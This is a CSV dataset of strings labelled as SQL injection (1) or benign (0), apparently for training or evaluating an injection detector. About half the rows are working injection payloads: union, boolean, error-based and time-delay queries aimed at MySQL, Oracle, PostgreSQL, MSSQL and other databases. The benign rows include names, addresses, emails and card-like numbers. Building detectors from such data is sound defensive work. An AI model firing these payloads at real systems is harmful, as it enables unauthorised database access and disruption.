Sentence,Label
"-6085 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1
chavez jofre,0
"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) ",1
milly7,0
ac40cent0,0
31229,0
jess,0
6038552435376719,0
65340567m,0
select  ( case when  ( 8841 = 9675 )  then 8841 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
"1  )  )   )  union all select null,null--",1
576,0
maritza5,0
"1' )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 'kejy' = 'kejy",1
"1""  )  )   )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
01213,0
1'|| ( select 'dfmw' from dual where 1723 = 1723,1
"1""  )  )   union all select null,null,null#",1
"1' where 2025 = 2025 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1 )  as iovi where 3910 = 3910 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",1
solania,0
*fradear,0
8,0
"1', ( select 6825 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6825 = 6825,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) ",1
1  )  )   and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
" Land Rover rally series announced The interior racing seats six-point harness belts , well intercom system ",0
schaafsma@gay-tantra.sj,0
1091303634326853,0
chinchintor,0
baumgarten bagudanc,0
"can ferragut, 132, 4?e",0
9859982019470735,0
 Participants must prove skill strength carrying bucket water 50 metres ,0
falconi@socimi.com.dd,0
benfield@chuecafamily.gs,0
47882,0
" end and  ( ""%"" = """,1
-8729'+ ( select 'nbzl' where 7160 = 7160 order by 1#,1
" select * from users where id = 1<@.. union select 1,version (  )  -- 1",1
"-1050""  )  )   or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  ""orfo"" like ""orfo",1
44588,0
nodonk@locuraporno.ar,0
"1%'  )  )   and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  '%' = '",1
paisaje,0
1626,0
1309699590331954,0
"1, ( select  ( case when  ( 5885 = 1825 )  then 1 else 5885* ( select 5885 from master..sysdatabases )  end  )  )  ",1
88194085x,0
" select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1
-8447 where 2850 = 2850 or 7147 = 3262,1
"1"" )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1%' union all select null,null,null,null,null,null#",1
99508422a,0
kuzz,0
"-4588"" union all select 4550,4550,4550,4550#",1
"1%""  )  )   )  union all select null#",1
vachiran,0
"1'  )  )   and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  'lshk' like 'lshk",1
12001090n,0
orzuelo,0
maryak,0
" He said new media tribunal &quot; always biased &apos;s extension government , &quot; restrictions content advertising would damage Kenya &apos;s place global economy ",0
"-4413%'  )  )   union all select 1345,1345#",1
moll aybar,0
thorne-smith@sandrasummer.fm,0
caruth5@wave.com.pt,0
"1'|| ( select 'drna' from dual where 5082 = 5082 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) ||'",1
pr3caz,0
tas9go,0
"1"" )  as ffon where 2738 = 2738 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",1
"-6848""  )  )   or 4071 = 5312",1
8288603955421514,0
altrichter@vilano.cu,0
"praza algalia de arriba, 188,",0
65119692e,0
cracoviano,0
cuccu@professionalhosting.com.uz,0
 crude December delivery 14 cents $ 96,0
9810,0
borsodi-heintje@unidadesdeventilacion.tg,0
1 )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 3836 = 3836,1
"-6942' )  union all select 7280,7280,7280#",1
39750,0
-4961' )  or 3038 = 3038,1
1' )  where 2840 = 2840,1
modigh,0
2239348379899052,0
p4rtapaz,0
cebuano,0
5370,0
"ballena, 91, 10?a",0
1'|| ( select 'ovlx' where 8767 = 8767 or sleep ( 5  )  )  ||',1
12810,0
"1 )  as zbha where 9700 = 9700 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
1 )  and 2006 = 2006,1
"calle la revoltosa, 55, 11c",0
" It seeking break emerging market auto insurance , drivers would pay based mileage ",0
16537,0
 One hundred people brought building safety ,0
"sierra santos, 71, 6?g",0
deacetis,0
 The voyage best ship zigzag line hundred tacks,0
"rio tajua 19,",0
" Expressions Middle Ages addressed Parish Councillor Christel Dehner: &quot; Aller guten Dinge sind drei &quot; (All good things come threes), &quot; blau machen &quot; (to skip school / work), &quot; etwas verhauen &quot; (to wallop something)",0
"-3924'|| ( select 'ssld' from dual where 6229 = 6229 union all select 6229,6229,6229,6229,6229#",1
"-5904"" where 9782 = 9782 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1
3015,0
" Lancashire &apos;s Serious Organised Crime Unit led investigation Mr Ditta also seen convicted three counts possession cocaine perverting course justice , demonstrating commitment bringing criminals justice ",0
"1"" )  where 1705 = 1705",1
navia de suarna,0
t16564l,0
13679,0
11203636z,0
farmacoplica,0
-9809' order by 1--,1
"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) # fzni",1
"1"" where 9792 = 9792 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1
 A hollow-stream nozzle building also used ,0
"gov accessible several hours tonight internal error occurred scheduled update , &quot; spy agency said emailed statement ",0
"plaza irineo gonzalez, s/n 13?f",0
ruperta,0
prepost1ra9in,0
hortensia,0
37724,0
melquades,0
"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",1
"1""  )  )   )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (   ( ""fcpm"" = ""fcpm",1
valencia,0
5ifi3a2i05,0
42808198t,0
im$ponderable,0
57970346l,0
balutis,0
" Georgen three half years prison exploitative human trafficking , pimping , issuing threats grievous bodily harm ",0
tris2,0
padmanab,0
"-1174"" union all select 4303,4303,4303,4303#",1
2633,0
7785029270305483,0
03171335a,0
mantateri.lla,0
6796191867385507,0
"1'  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  'dgwe' like 'dgwe",1
9270844246904218,0
"1%' )  union all select null,null,null,null,null,null,null,null#",1
3040,0
"1"" )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( ""baia"" = ""baia",1
7118,0
"1 )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( 1773 = 1773",1
"torre-pacheco 35,",0
2106115502546760,0
38435,0
1'+ ( select yjyp where 9696 = 9696,1
48530,0
"1""  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1'  )  )   as babx where 2494 = 2494 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
celfa,0
"-7795"" )  where 1712 = 1712 union all select 1712,1712,1712,1712#",1
oplinger,0
24n1e39,0
-9562' or 8571 = 8571--,1
" select * from users where id = 1 or 1#"", union select 1,version (  )  -- 1",1
mong-tse,0
"1'  )  )   procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (  'kufi' = 'kufi",1
" En route , mail pass number servers Internet ",0
quilligan.posselt@thw-adm.gy,0
calle gurugu 142 4?d,0
"calle puebla de los infantes, 145",0
635l82rab74id35,0
calabrs,0
"1 )  as qodq where 4945 = 4945 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
-3821' )  or 9323 = 9323#,1
pent0et3o,0
43427,0
"1"" )  where 9115 = 9115",1
faustiniano,0
"c/ orion, 10,",0
pacfica,0
75771832b,0
 ( 8266 = 8266 ) *9900,1
"1' or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and 'jiyx' = 'jiyx",1
leocadia,0
59560161m,0
"-1999 )  union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",1
68252027x,0
46793939w,0
45681,0
"-8888%' )  union all select 5312,5312,5312,5312,5312,5312,5312,5312--",1
"manuel de falla 119,",0
"-3081""  )  )   )  or 3736 = 1899",1
dueppen,0
"c/ estambul, 117",0
4231744159905009,0
0184493259280421,0
"-5078 union all select 9708,9708--",1
1  )  )   )  union all select null#,1
"1""  )  )   as aamh where 7432 = 7432  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
" ( updatexml ( 8862,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 8862 = 8862,1  )  )   ) ,0x717a767a71 ) ,8981  )  )  ",1
0285055545146355,0
gianna,0
5933,0
"1"" where 1852 = 1852 union all select null,null,null,null,null,null,null,null,null#",1
escultor damian forment 128 11?g,0
"1' and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and 'qyyg' = 'qyyg",1
carlin,0
"einstein 185, 6?f",0
ergasto,0
1  )  )   as cwyb where 3633 = 3633,1
felip campos,0
46120,0
moncada,0
"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",1
"1%' )  union all select null,null,null,null,null,null--",1
"1"" )  as ufai where 9673 = 9673",1
"iif ( 1539 = 1539,1539,1/0 ) ",1
3618056132500846,0
"-1148""  )  )   union all select 5442,5442,5442,5442#",1
"1%""  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  ""%"" = """,1
80937614q,0
04176,0
wilton7@weat.ic,0
"1 )  as bfuy where 3879 = 3879 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1"" )  where 6255 = 6255 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",1
calle codigo correspondencia oficial correos-telegrafos s/n 9a,0
"1"" )  where 8588 = 8588",1
69441548v,0
"1%'  )  )   )  and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (   ( ""%"" = """,1
irissou,0
38948590e,0
1'|| ( select 'boib' where 9595 = 9595,1
" He manages focus audience &apos;s attention , result monologues never become boring , even moment ",0
" Do I know beforehand possibly say new spontaneous word? Do I know that, ostentation examining grounds institution, thing? Do I know pledged look one side, — permitted side, man, parish minister? He retained attorney, airs bench emptiest affectation",0
"c/ motilla 19, 1c",0
"c/ 57 15, 9g",0
whipple,0
"el reyezuelo, 15",0
ocaa alcover,0
"1'  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 'swfj' like 'swfj",1
palmera,0
avinguda mas fuster 175 8b,0
c/ cardenal benilloch 171 12?h,0
select  ( case when  ( 5698 = 3453 )  then 5698 else 1/ ( select 0 )  end ) --,1
select  ( case when  ( 1014 = 4280 )  then 1014 else 1014* ( select 1014 from mysql.db )  end ) #,1
"1' )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( 'ireg' like 'ireg",1
"-9606 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) # iuij",1
"’ Rough graceless would greeting, truth handsomer affectation love",0
di7a?g7r,0
"1'  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  'sxgl' = 'sxgl",1
29424173c,0
"1 where 2278 = 2278 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
34486,0
"1""  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1
12480,0
sant jaume de frontany,0
82768054r,0
hampton-bourne@soyandaluz.lv,0
renick@piaceredelivery.hn,0
semanera,0
" The Leipferdingen Nursing Home turn 40 years old , Geisingen School new location 50 years celebrating 10 May , Polyhymnia Leipferdingen music association turn 150 years old celebrating part Brunnenfest &#91; Fountain Festival &#93; 4 7 July ",0
"1  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  8554 = 8554",1
concursado,0
-2241 )  where 7606 = 7606 or  ( 8459 = 8459 ) *4906--,1
"1'  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'lyem' like 'lyem",1
31788831w,0
"1' or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and 'rhzy' = 'rhzy",1
yun,0
0003204654562755,0
"-8833'  )  )   union all select 3227,3227,3227,3227,3227--",1
!,1
-8086%' )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( '%' = ',1
1'  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( 'ugrk' = 'ugrk,1
-9145' )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 'yvfl' like 'yvfl,1
" &quot; Most headliners appeared Carolines , went greater success , point &apos;re big play club , &quot; Hirsch said ",0
822rrac106,0
g16i7a0a,0
cardias,0
alvino,0
milligan,0
"1  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  9914 = 9914",1
"-6442""  )  )   )  or 3038 = 3038",1
nickie,0
" select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",1
8490972534756597,0
salas solmoirago,0
48825670m,0
"1""  )  )   or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1%"" and elt ( 1210 = 1210,sleep ( 5  )  )   and ""%"" = """,1
"chopo, 10",0
morgan,0
"-7306"" or 2081 = 6847",1
"1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
"calle la merce, 120",0
30731993z,0
24930,0
aldehuela del codonal,0
"1'|| ( select 'nfgq' where 1837 = 1837 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
1523492896649032,0
belmonte de gracin,0
" Ruins measuring five metres tall , made stones around size palm hand , waiting discovered ",0
"-1366' or make_set ( 9354 = 9354,7185 )  and 'abre' = 'abre",1
carricar,0
disney,0
"-6595  )  )   )  union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",1
86651591b,0
85089975a,0
1901048287713824,0
38747653j,0
albets vilar,0
natal,0
rhonda,0
anteda,0
miriamne,0
"1%""  )  )   )  and 8438 = 7620--",1
"-1084' )  union all select 2634,2634,2634,2634,2634,2634,2634,2634#",1
c9r6n0233esca,0
7395,0
segura de toro,0
"-9176'  )  )   as eunw where 5978 = 5978 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
"1"" or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""deeu"" like ""deeu",1
1  )  )   union all select null--,1
5447434200049270,0
1'  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (   ( 'lajk' = 'lajk,1
" The magnetic activity star , interaction magnetic field emitted particle radiation play important role ",0
"1"" and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) ",1
25138,0
mazarick1,0
abordonar,0
panella castelv,0
calle arins 87 4?e,0
"1%'  )  )   and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
23734,0
"1%' or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
3324392405940394,0
1 )  as bpap where 7758 = 7758 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( ""ymss"" = ""ymss",1
paulovic,0
37500,0
courtena,0
ogassa,0
9274,0
3283,0
santilln dennett,0
5arneci052,0
"1' )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1
"passeig de la plaa major 11, 3?f",0
"1""  )  )   as luon where 4676 = 4676 rlike sleep ( 5 ) #",1
" It &apos;s backbreaking pace , village musicians usually help keep team motivated ",0
"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
select  ( case when  ( 2132 = 8969 )  then 1 else 2132* ( select 2132 from master..sysdatabases )  end ) --,1
qu1s3da,0
piwkowsk,0
9634788762109730,0
"-8902 union all select 4339,4339,4339#",1
7756,0
3596,0
65658514t,0
vacas de san juan 153,0
"-1401""  )  )   union all select 3480,3480,3480,3480,3480,3480--",1
"1"" )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and  ( ""mhfc"" = ""mhfc",1
"1""  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( ""atlz"" = ""atlz",1
zuk,0
1' or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and 'iwmy' = 'iwmy,1
valdovio,0
"1 where 6412 = 6412 union all select null,null,null,null,null,null,null--",1
2780139956948714,0
-7187' or 4159 = 7465,1
boom@paseotuperro.mo,0
baxley@italianmotorvillagesevilla.sh,0
 Trust thyself: every heart vibrates iron string,0
" select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",1
"1"" )  where 8153 = 8153",1
"1%' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( '%' = '",1
